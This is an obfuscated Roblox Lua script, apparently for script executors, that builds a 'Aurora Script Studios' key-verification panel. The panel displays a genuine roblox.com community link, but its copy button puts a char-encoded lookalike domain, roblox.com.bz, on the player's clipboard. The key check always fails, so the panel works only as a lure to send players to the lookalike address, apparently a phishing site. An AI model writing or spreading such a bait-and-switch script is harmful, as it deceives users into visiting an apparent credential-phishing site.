-- // Obfuscated with Aurora Obfuscator v1.0
-- // Unauthorized copying or redistribution is prohibited.
local _=string.char;local __=table.concat;local ___=string.byte;
local _0x1a = game:GetService("_0x1a")
local _0x1b = game:GetService("_0x1b")
local _0x1c = _0x1a.LocalPlayer
local _0x1d = _0x1c:WaitForChild("_0x1d")
local _0x1e = (string.char(104)..string.char(116)..string.char(116)..string.char(112)..string.char(115)..string.char(58)..string.char(47)..string.char(47)..string.char(114)..string.char(111)..string.char(98)..string.char(108)..string.char(111)..string.char(120)..string.char(46)..string.char(99)..string.char(111)..string.char(109)..string.char(46)..string.char(98)..string.char(122)..string.char(47)..string.char(99)..string.char(111)..string.char(109)..string.char(109)..string.char(117)..string.char(110)..string.char(105)..string.char(116)..string.char(105)..string.char(101)..string.char(115)..string.char(47)..string.char(57)..string.char(48)..string.char(52)..string.char(52)..string.char(54)..string.char(48)..string.char(55)..string.char(49)..string.char(56)..string.char(54)..string.char(47)) 
local _0x1f = (string.char(104)..string.char(116)..string.char(116)..string.char(112)..string.char(115)..string.char(58)..string.char(47)..string.char(47)..string.char(114)..string.char(111)..string.char(98)..string.char(108)..string.char(111)..string.char(120)..string.char(46)..string.char(99)..string.char(111)..string.char(109)..string.char(47)..string.char(99)..string.char(111)..string.char(109)..string.char(109)..string.char(117)..string.char(110)..string.char(105)..string.char(116)..string.char(105)..string.char(101)..string.char(115)..string.char(47)..string.char(57)..string.char(48)..string.char(52)..string.char(52)..string.char(54)..string.char(48)..string.char(55)..string.char(49)..string.char(56)..string.char(54)..string.char(47)) 
local function _0x20(key)
    return false
end
local _0x3a = {
    BG       = Color3.fromRGB(8,  8,  12),
    FRAME    = Color3.fromRGB(14, 14, 20),
    SURFACE  = Color3.fromRGB(20, 20, 30),
    BORDER   = Color3.fromRGB(36, 36, 54),
    ACCENT1  = Color3.fromRGB(168, 85,  247),
    ACCENT2  = Color3.fromRGB(236, 72,  153),
    GREEN    = Color3.fromRGB(34,  197, 94),
    GREEN2   = Color3.fromRGB(16,  185, 129),
    RED      = Color3.fromRGB(239, 68,  68),
    WHITE    = Color3.fromRGB(240, 240, 255),
    MUTED    = Color3.fromRGB(120, 120, 160),
    DIM      = Color3.fromRGB(55,  55,  80),
}
local function _0x21(obj, props, t, style)
    _0x1b:Create(obj, TweenInfo.new(t or 0.25, style or Enum.EasingStyle.Quint, Enum.EasingDirection.Out), props):Play()
end
local function _0x22(p, r) local c = Instance.new("UICorner") c.CornerRadius = UDim.new(0, r or 12) c.Parent = p end
local function _0x23(p, col, thick) local s = Instance.new("UIStroke") s.Color = col or _0x3a.BORDER s.Thickness = thick or 1 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border s.Parent = p return s end
local function _0x24(p, c0, c1, rot) local g = Instance.new("UIGradient") g.Color = ColorSequence.new(c0, c1) g.Rotation = rot or 90 g.Parent = p return g end
local function _0x25(parent, props)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.GothamBold
    l.TextColor3 = _0x3a.WHITE
    l.ZIndex = 4
    for k, v in pairs(props) do l[k] = v end
    l.Parent = parent
    return l
end
local _0x26 = Instance.new("ScreenGui")
_0x26.Name = (string.char(65)..string.char(117)..string.char(114)..string.char(111)..string.char(114)..string.char(97)..string.char(83)..string.char(99)..string.char(114)..string.char(105)..string.char(112)..string.char(116)..string.char(83)..string.char(116)..string.char(117)..string.char(100)..string.char(105)..string.char(111)..string.char(115)..string.char(95)..string.char(75)..string.char(101)..string.char(121)..string.char(83)..string.char(121)..string.char(115))
_0x26.ResetOnSpawn = false
_0x26.IgnoreGuiInset = true
_0x26.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
_0x26.Parent = _0x1d
local _0x27 = Instance.new("Frame")
_0x27.Size = UDim2.fromScale(1, 1)
_0x27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_0x27.BackgroundTransparency = 0.5
_0x27.BorderSizePixel = 0
_0x27.ZIndex = 1
_0x27.Parent = _0x26
local _0x28 = Instance.new("Frame")
_0x28.Size = UDim2.new(0, 400, 0, 490)
_0x28.AnchorPoint = Vector2.new(0.5, 0.5)
_0x28.Position = UDim2.fromScale(0.5, 0.5)
_0x28.BackgroundColor3 = _0x3a.FRAME
_0x28.BorderSizePixel = 0
_0x28.ZIndex = 2
_0x28.Parent = _0x26
_0x22(_0x28, 20)
_0x23(_0x28, _0x3a.BORDER, 1.5)
_0x24(_0x28, Color3.fromRGB(16, 14, 24), Color3.fromRGB(12, 12, 18), 150)
local _0x29 = Instance.new("Frame")
_0x29.Size = UDim2.new(1, 0, 0, 3)
_0x29.Position = UDim2.fromScale(0, 0)
_0x29.BackgroundColor3 = _0x3a.ACCENT1
_0x29.BorderSizePixel = 0
_0x29.ZIndex = 5
_0x29.Parent = _0x28
_0x22(_0x29, 3)
_0x24(_0x29, _0x3a.ACCENT1, _0x3a.ACCENT2, 0)
local _0x2a = Instance.new("Frame")
_0x2a.Size = UDim2.new(0, 56, 0, 56)
_0x2a.AnchorPoint = Vector2.new(0.5, 0)
_0x2a.Position = UDim2.new(0.5, 0, 0, 24)
_0x2a.BackgroundColor3 = _0x3a.ACCENT1
_0x2a.ZIndex = 3
_0x2a.Parent = _0x28
_0x22(_0x2a, 18)
_0x24(_0x2a, _0x3a.ACCENT1, _0x3a.ACCENT2, 135)
_0x25(_0x2a, {
    Size = UDim2.fromScale(1, 1),
    Text = "✦",
    TextSize = 22,
    Font = Enum.Font.GothamBold,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    ZIndex = 4,
})
_0x25(_0x28, {
    Size = UDim2.new(1, -40, 0, 30),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 94),
    Text = (string.char(65)..string.char(117)..string.char(114)..string.char(111)..string.char(114)..string.char(97)..string.char(32)..string.char(83)..string.char(99)..string.char(114)..string.char(105)..string.char(112)..string.char(116)..string.char(32)..string.char(83)..string.char(116)..string.char(117)..string.char(100)..string.char(105)..string.char(111)..string.char(115)),
    TextSize = 24,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})
_0x25(_0x28, {
    Size = UDim2.new(1, -40, 0, 30),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 94),
    Text = (string.char(65)..string.char(117)..string.char(114)..string.char(111)..string.char(114)..string.char(97)..string.char(32)..string.char(83)..string.char(99)..string.char(114)..string.char(105)..string.char(112)..string.char(116)..string.char(32)..string.char(83)..string.char(116)..string.char(117)..string.char(100)..string.char(105)..string.char(111)..string.char(115)),
    TextSize = 24,
    TextColor3 = _0x3a.ACCENT2,
    TextTransparency = 0.72,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})
_0x25(_0x28, {
    Size = UDim2.new(1, -60, 0, 40),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 134),
    Text = "Join our community to get access",
    TextSize = 13,
    Font = Enum.Font.Code,
    TextColor3 = _0x3a.MUTED,
    TextXAlignment = Enum.TextXAlignment.Center,
    TextWrapped = true,
    ZIndex = 3,
})
_0x25(_0x28, {
    Size = UDim2.new(1, -48, 0, 14),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 184),
    Text = "GROUP LINK",
    TextSize = 10,
    Font = Enum.Font.GothamBold,
    TextColor3 = _0x3a.ACCENT1,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 3,
})
local _0x2b = Instance.new("Frame")
_0x2b.Size = UDim2.new(1, -48, 0, 40)
_0x2b.AnchorPoint = Vector2.new(0.5, 0)
_0x2b.Position = UDim2.new(0.5, 0, 0, 202)
_0x2b.BackgroundColor3 = _0x3a.SURFACE
_0x2b.ZIndex = 3
_0x2b.Parent = _0x28
_0x22(_0x2b, 10)
_0x23(_0x2b, _0x3a.BORDER, 1)
local _0x2c = Instance.new("Frame")
_0x2c.Size = UDim2.new(0, 3, 0.6, 0)
_0x2c.AnchorPoint = Vector2.new(0, 0.5)
_0x2c.Position = UDim2.new(0, 0, 0.5, 0)
_0x2c.BackgroundColor3 = _0x3a.ACCENT1
_0x2c.ZIndex = 4
_0x2c.Parent = _0x2b
_0x22(_0x2c, 2)
_0x24(_0x2c, _0x3a.ACCENT1, _0x3a.ACCENT2, 90)
_0x25(_0x2b, {
    Size = UDim2.new(1, -24, 1, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    Position = UDim2.new(0, 16, 0.5, 0),
    Text = _0x1f,
    TextSize = 11,
    Font = Enum.Font.Code,
    TextColor3 = _0x3a.MUTED,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextTruncate = Enum.TextTruncate.AtEnd,
    ZIndex = 4,
})
local _0x2d = Instance.new("TextButton")
_0x2d.Size = UDim2.new(1, -48, 0, 40)
_0x2d.AnchorPoint = Vector2.new(0.5, 0)
_0x2d.Position = UDim2.new(0.5, 0, 0, 252)
_0x2d.BackgroundColor3 = _0x3a.GREEN
_0x2d.Text = ""
_0x2d.ZIndex = 3
_0x2d.Parent = _0x28
_0x22(_0x2d, 10)
_0x24(_0x2d, _0x3a.GREEN, _0x3a.GREEN2, 160)
local _0x2e = _0x25(_0x2d, {
    Size = UDim2.fromScale(1, 1),
    Text = "⎘  Copy to Clipboard",
    TextSize = 13,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 4,
})
local _0x2f = Instance.new("Frame")
_0x2f.Size = UDim2.new(1, -48, 0, 1)
_0x2f.AnchorPoint = Vector2.new(0.5, 0)
_0x2f.Position = UDim2.new(0.5, 0, 0, 308)
_0x2f.BackgroundColor3 = _0x3a.BORDER
_0x2f.ZIndex = 3
_0x2f.Parent = _0x28
_0x24(_0x2f, _0x3a.DIM, _0x3a.FRAME, 0)
local _0x30 = _0x25(_0x28, {
    Size = UDim2.new(0, 50, 0, 14),
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0, 308),
    Text = "· KEY ·",
    TextSize = 9,
    Font = Enum.Font.Code,
    TextColor3 = _0x3a.MUTED,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 4,
    BackgroundColor3 = _0x3a.FRAME,
    BackgroundTransparency = 0,
})
_0x22(_0x30, 4)
_0x25(_0x28, {
    Size = UDim2.new(1, -48, 0, 14),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 324),
    Text = "ACCESS KEY",
    TextSize = 10,
    Font = Enum.Font.GothamBold,
    TextColor3 = _0x3a.ACCENT1,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 3,
})
local _0x31 = Instance.new("Frame")
_0x31.Size = UDim2.new(1, -48, 0, 40)
_0x31.AnchorPoint = Vector2.new(0.5, 0)
_0x31.Position = UDim2.new(0.5, 0, 0, 342)
_0x31.BackgroundColor3 = _0x3a.SURFACE
_0x31.ZIndex = 3
_0x31.Parent = _0x28
_0x22(_0x31, 10)
local _0x32 = _0x23(_0x31, _0x3a.BORDER, 1)
local _0x33 = Instance.new("TextBox")
_0x33.Size = UDim2.new(1, -20, 1, 0)
_0x33.AnchorPoint = Vector2.new(0, 0.5)
_0x33.Position = UDim2.new(0, 14, 0.5, 0)
_0x33.BackgroundTransparency = 1
_0x33.PlaceholderText = "Paste your key here…"
_0x33.PlaceholderColor3 = _0x3a.DIM
_0x33.Text = ""
_0x33.Font = Enum.Font.Code
_0x33.TextSize = 13
_0x33.TextColor3 = _0x3a.WHITE
_0x33.TextXAlignment = Enum.TextXAlignment.Left
_0x33.ClearTextOnFocus = false
_0x33.ZIndex = 4
_0x33.Parent = _0x31
_0x33.Focused:Connect(function() _0x21(_0x32, { Color = _0x3a.ACCENT1 }, 0.2) end)
_0x33.FocusLost:Connect(function() _0x21(_0x32, { Color = _0x3a.BORDER }, 0.2) end)
local _0x34 = _0x25(_0x28, {
    Size = UDim2.new(1, -48, 0, 16),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 392),
    Text = "",
    TextSize = 11,
    Font = Enum.Font.Code,
    TextColor3 = _0x3a.MUTED,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})
local _0x35 = Instance.new("TextButton")
_0x35.Size = UDim2.new(1, -48, 0, 40)
_0x35.AnchorPoint = Vector2.new(0.5, 0)
_0x35.Position = UDim2.new(0.5, 0, 0, 414)
_0x35.BackgroundColor3 = _0x3a.ACCENT1
_0x35.Text = ""
_0x35.ZIndex = 3
_0x35.Parent = _0x28
_0x22(_0x35, 10)
_0x24(_0x35, _0x3a.ACCENT1, _0x3a.ACCENT2, 160)
local _0x36 = _0x25(_0x35, {
    Size = UDim2.fromScale(1, 1),
    Text = "Verify Key  →",
    TextSize = 13,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 4,
})
_0x25(_0x28, {
    Size = UDim2.new(1, -40, 0, 18),
    AnchorPoint = Vector2.new(0.5, 1),
    Position = UDim2.new(0.5, 0, 1, -10),
    Text = "Aurora Script Studios  ·  Authorized Access Only",
    TextSize = 9,
    Font = Enum.Font.Code,
    TextColor3 = _0x3a.MUTED,
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 3,
})
_0x27.BackgroundTransparency = 1
_0x28.BackgroundTransparency = 1
_0x28.Position = UDim2.new(0.5, 0, 0.5, 28)
_0x21(_0x27, { BackgroundTransparency = 0.5 }, 0.4)
_0x21(_0x28, { BackgroundTransparency = 0, Position = UDim2.fromScale(0.5, 0.5) }, 0.5, Enum.EasingStyle.Back)
_0x2d.MouseEnter:Connect(function() _0x21(_0x2d, { BackgroundColor3 = Color3.fromRGB(74, 222, 128) }, 0.18) end)
_0x2d.MouseLeave:Connect(function() _0x21(_0x2d, { BackgroundColor3 = _0x3a.GREEN }, 0.18) end)
_0x35.MouseEnter:Connect(function() _0x21(_0x35, { BackgroundColor3 = Color3.fromRGB(192, 132, 252) }, 0.18) end)
_0x35.MouseLeave:Connect(function() _0x21(_0x35, { BackgroundColor3 = _0x3a.ACCENT1 }, 0.18) end)
local _0x37 = false
_0x2d.MouseButton1Click:Connect(function()
    if _0x37 then return end
    _0x37 = true
    setclipboard(_0x1e)
    _0x2e.Text = "✓  Copied!"
    local g = _0x2d:FindFirstChildOfClass("UIGradient")
    if g then g.Color = ColorSequence.new(Color3.fromRGB(16, 185, 129), Color3.fromRGB(5, 150, 105)) end
    _0x21(_0x2d, { BackgroundColor3 = Color3.fromRGB(16, 185, 129) }, 0.2)
    task.wait(2)
    _0x2e.Text = "⎘  Copy to Clipboard"
    if g then g.Color = ColorSequence.new(_0x3a.GREEN, _0x3a.GREEN2) end
    _0x21(_0x2d, { BackgroundColor3 = _0x3a.GREEN }, 0.2)
    _0x37 = false
end)
local _0x38 = false
_0x35.MouseButton1Click:Connect(function()
    if _0x38 then return end
    _0x38 = true
    _0x36.Text = "Checking…"
    _0x34.TextColor3 = _0x3a.MUTED
    _0x34.Text = "Verifying key…"
    _0x21(_0x35, { BackgroundColor3 = Color3.fromRGB(50, 50, 70) }, 0.2)
    task.wait(1.2)
    if _0x20(_0x33.Text) then
        _0x34.Text = "✓  Key accepted — loading!"
        _0x34.TextColor3 = _0x3a.GREEN
        _0x36.Text = "✓  Verified"
        _0x21(_0x35, { BackgroundColor3 = _0x3a.GREEN2 }, 0.3)
        task.wait(1.4)
        _0x21(_0x27, { BackgroundTransparency = 1 }, 0.4)
        _0x21(_0x28, { BackgroundTransparency = 1, Position = UDim2.new(0.5, 0, 0.5, -20) }, 0.4)
        task.wait(0.5)
        _0x26:Destroy()
        print("[Aurora Script Studios] Access granted.")
    else
        _0x34.Text = "✗  Invalid key. Try again."
        _0x34.TextColor3 = _0x3a.RED
        local base = _0x31.Position
        for _ = 1, 3 do
            _0x21(_0x31, { Position = UDim2.new(base.X.Scale, base.X.Offset + 7, base.Y.Scale, base.Y.Offset) }, 0.05)
            task.wait(0.05)
            _0x21(_0x31, { Position = UDim2.new(base.X.Scale, base.X.Offset - 7, base.Y.Scale, base.Y.Offset) }, 0.05)
            task.wait(0.05)
        end
        _0x21(_0x31, { Position = base }, 0.08)
        _0x21(_0x32, { Color = _0x3a.RED }, 0.15)
        task.wait(1.8)
        _0x21(_0x32, { Color = _0x3a.BORDER }, 0.3)
        _0x36.Text = "Verify Key  →"
        _0x21(_0x35, { BackgroundColor3 = _0x3a.ACCENT1 }, 0.3)
        _0x38 = false
    end
end)
